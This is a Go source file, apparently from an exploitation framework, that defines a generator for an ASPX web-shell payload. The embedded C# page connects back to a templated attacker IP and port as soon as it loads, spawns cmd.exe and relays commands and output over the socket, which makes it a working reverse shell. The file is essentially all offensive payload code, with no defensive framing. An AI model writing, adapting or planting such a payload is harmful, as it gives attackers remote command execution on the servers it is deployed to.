package shellcode

import "strings"

type DotnetShellCode struct {
    *ShellCodeBase
}

func NewDotnetShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *DotnetShellCode {
    base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
    return &DotnetShellCode{base}
}

func (dsc *DotnetShellCode) GetAspxCode() string {
    dotnetCode := `
    <%@ Page Language="C#" %>
        <%@ Import Namespace="System.Runtime.InteropServices" %>
        <%@ Import Namespace="System.Net" %>
        <%@ Import Namespace="System.Net.Sockets" %>
        <%@ Import Namespace="System.Diagnostics" %>
        <%@ Import Namespace="System.IO" %>
        <%@ Import Namespace="System.Security.Principal" %>
        <script runat="server">
            static NetworkStream socketStream;
            protected void CallbackShell(string server, int port)
            {
                System.Net.Sockets.TcpClient clientSocket = new System.Net.Sockets.TcpClient();
                clientSocket.Connect(server, port);
                socketStream = clientSocket.GetStream();
                Byte[] bytes = new Byte[8192];
                String data = null;
                Process CmdProc;
                CmdProc = new Process();
                CmdProc.StartInfo.FileName = "cmd";
                CmdProc.StartInfo.UseShellExecute = false;
                CmdProc.StartInfo.RedirectStandardInput = true;
                CmdProc.StartInfo.RedirectStandardOutput = true;
                CmdProc.StartInfo.RedirectStandardError = true;
                CmdProc.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
                CmdProc.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);
                CmdProc.Start();
                CmdProc.BeginOutputReadLine();
                CmdProc.BeginErrorReadLine();
                StreamWriter sortStreamWriter = CmdProc.StandardInput;
                int i;
                while ((i = socketStream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                    if (data == "exit")
                        break;
                    sortStreamWriter.WriteLine(data.Trim());
                }
                clientSocket.Close();
                CmdProc.Close();
            }
            public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                string[] SplitData = outLine.Data.Split('\\n');
                foreach (string s in SplitData)
                {
                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\\r\\n");
                     socketStream.Write(msg, 0, msg.Length);
                }
            }
            protected void Page_Load(object sender, EventArgs e)
            {
                CallbackShell("{{LOCALHOST}}", {{LOCALPORT}});
            }
        </script>
    `
    aspxCode := dsc.GenShellCode(strings.TrimSpace(dotnetCode))
    return aspxCode
}

func (dsc *DotnetShellCode) GetShellCode(inline bool) string {
    shell := dsc.GetAspxCode()
    if inline {
        shell = dsc.MakeInline(shell)
    }

    return shell
}
